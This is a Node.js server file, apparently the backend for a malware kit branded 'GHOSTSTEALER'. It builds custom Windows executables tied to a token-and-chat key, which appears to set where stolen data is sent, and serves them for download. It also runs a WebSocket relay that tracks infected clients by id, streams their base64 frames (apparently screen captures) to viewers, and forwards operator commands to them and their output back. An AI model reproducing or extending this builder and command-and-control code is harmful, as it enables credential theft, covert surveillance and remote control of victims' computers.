const
    { api } = require("./config.js"),
    fs = require('fs'),
    express = require('express'), app = express(), http = require("http"), WebSocket = require("ws"),
    cors = require('cors'), cookieParser = require('cookie-parser'),
    robots = require("express-robots-txt"),
    Build = require("./build/script/builder.js"),
    { jsonToBase64, getrsize, checkKey } = require("./utils/all.js");
require("colors");
// process.on('uncaughtException', (err) => {if (err) return;});
// process.on('unhandledRejection', (err) => {if (err) return;});

app.use(cors());
app.use(cookieParser());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ limit: '50mb', extended: true, parameterLimit: 50000 }));

app.use(express.static('./build/dist'));
app.use(express.static('./public'));
app.set("views", "./public");
app.use(robots({ UserAgent: "*", Disallow: "/", }));

console.log(`
██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗███████╗████████╗███████╗ █████╗ ██╗     ███████╗██████╗ 
██╔════╝ ██║  ██║██╔═══██╗██╔════╝╚══██╔══╝██╔════╝╚══██╔══╝██╔════╝██╔══██╗██║     ██╔════╝██╔══██╗
██║  ███╗███████║██║   ██║███████╗   ██║   ███████╗   ██║   █████╗  ███████║██║     █████╗  ██████╔╝
██║   ██║██╔══██║██║   ██║╚════██║   ██║   ╚════██║   ██║   ██╔══╝  ██╔══██║██║     ██╔══╝  ██╔══██╗
╚██████╔╝██║  ██║╚██████╔╝███████║   ██║   ███████║   ██║   ███████╗██║  ██║███████╗███████╗██║  ██║
 ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝   ╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝
`.blue);
console.log("=> ".red + "By https://github.com/zougataga".blue);

const
    server = http.createServer(app),
    wss = new WebSocket.Server({ server });
let clients = [], clients2 = [];
app.get(`/`, (req, res) => res.redirect("https://github.com/zougataga"));
app.get(`/stream`, (req, res) => res.sendFile("stream.html", { root: "./public" }));
app.get(`/connexion`, (req, res) => res.sendFile("connexion.html", { root: "./public" }));
app.get(`/build`, (req, res) => res.sendFile("build.html", { root: "./public" }));
app.post(`/build`, async (req, res) => {
    const
        domain = `${api.protocole}://${api.host}${api.port === 80 ? "" : `:${api.port}`}`,
        { key } = req.body;
    if (!key) return res.send({ type: "2" });
    const build = await Build(key, domain);
    if (!build) return res.send({ type: "2" });
    res.send({ type: "1", time: build.time || "0s", id: build.id })
});
app.get(`/download`, async (req, res) => {
    const { time, id } = req.query;
    if (!id || !fs.existsSync(`./build/dist/${id}/${id}.exe`)) return res.send({ err: ":(" })
    res.render("download.ejs", { time, id, size: getrsize(fs.statSync(`./build/dist/${id}/${id}.exe`).size) })
});
app.get(`/ghoststealer`, async (req, res) => {
    const { id } = req.query;
    if (!id || !fs.existsSync(`./build/dist/${id}/${id}.exe`)) return res.send({ err: ":(" })
    res.sendFile(`${id}.exe`, { root: `./build/dist/${id}/` });
});

app.get(`/uuid/get`, (req, res) => {
    const { uuid } = req.query;
    if (!uuid) return res.destroy().end();
    wss.verifAllClients();
    const exist = clients.find(e => e.uuid == uuid);
    res.send(exist)
});
app.get(`/createkey`, async (req, res) => {
    const { token, chat } = req.query;
    if (!token && !chat) return res.json({ type: 2, err: "Merci de fournir un token et un chat" });
    const isReal = await checkKey(token, chat);
    if ((!isReal?.token && !isReal?.chat) || (!isReal?.token && isReal?.chat) || (isReal?.token && !isReal?.chat)) return res.json({ type: 2, err: "Merci de fournir un token et un chat VALIDE", isReal });
    const key = jsonToBase64({ token, chat });
    res.json({ type: 1, key, isReal });
});

wss.verifAllClients = function () {
    let rclients = [];
    clients.forEach(e => {
        if (e?.co?.readyState === WebSocket.OPEN) { rclients.push(e) } else {
            const c2 = wss.getClients(2, e?.uuid) || [];
            c2?.forEach(e => {
                e?.co?.send(JSON.stringify({ type: "error" }));
                // wss.deleteClients(2, e?.uuid);
            })
        }
    });
    clients = rclients;
    let rclients2 = [];
    clients2.forEach(e => { if (e?.co?.readyState === WebSocket.OPEN) { rclients2.push(e) } });
    clients2 = rclients2;
    return;
};
wss.getClients = function (type, uuid, type2) {
    let c, d = [];
    if (type == 1) c = clients;
    else if (type == 2) c = clients2;
    if (!c) return;
    c.forEach(e => {
        if (e.uuid == uuid) {
            if (type == 2 && e.type == type2) d.push(e);
            else if (type == 1) d.push(e);
            else if (type == 2 && !type2) d.push(e);
        }
    });
    return !d?.length && d?.length == 0 ? false : d
};
wss.deleteClients = function (type, uuid) {
    let c, d;
    if (type == 1) {
        let newc = [];
        clients.forEach(e => {
            if (e.uuid != uuid) {
                newc.push(e)
            }
        });
        clients = newc;
    }
    else if (type == 2) {
        let newc = [];
        clients2.forEach(e => {
            if (e.uuid != uuid) {
                newc.push(e)
            }
        });
        clients2 = newc;
    }
};

wss.on('connection', (co) => {
    co.on("close", () => wss.verifAllClients());
    co.on('message', (message) => {
        const data = JSON.parse(message);
        wss.verifAllClients();
        if (data.type == "newclient" && data.uuid) {
            const findC = wss.getClients(1, data.uuid);
            clients2.forEach(e => { if (e.uuid == data.uuid) e?.co?.send(JSON.stringify({ type: "start" })) });
            console.log(`[LOGS] New client: ${data.uuid}`.green);
            if (!findC) clients.push({ uuid: data.uuid, co });
        };
        if (data.type == "newclient2" && data.uuid && data.type) {
            const findC = wss.getClients(1, data.uuid);
            clients2.push({ uuid: data.uuid, type: data.type2, co });
            console.log(`[LOGS] New client2: ${data.uuid}`.green);
            if (findC) co.send(JSON.stringify({ type: "start" }));
        };

        if (data.type == "stream" && data.uuid && data.base64) {
            const findC = wss.getClients(2, data.uuid, data.type);
            if (!findC) return co.send(JSON.stringify({ type: "error" }));
            else findC?.forEach(e => e?.co?.send(JSON.stringify(data)))
        };

        if (data.type == "cmd" && data.uuid && data.cmd) {
            const findC = wss.getClients(1, data.uuid);
            if (!findC) return co.send(JSON.stringify({ type: "error" }));
            else findC?.forEach(e => e?.co?.send(JSON.stringify(data)))
        }
        if (data.type == "cmd" && data.msg) {
            const findC = wss.getClients(2, data.uuid, data.type);
            if (!findC) return;
            else findC?.forEach(e => e?.co?.send(JSON.stringify(data)))
        };
    });

    co.send(JSON.stringify({ type: "on" }));
});


server.listen(api.port, () => {
    console.log("=> ".red + `API connecter sur le port ${api.port}`.green);
});
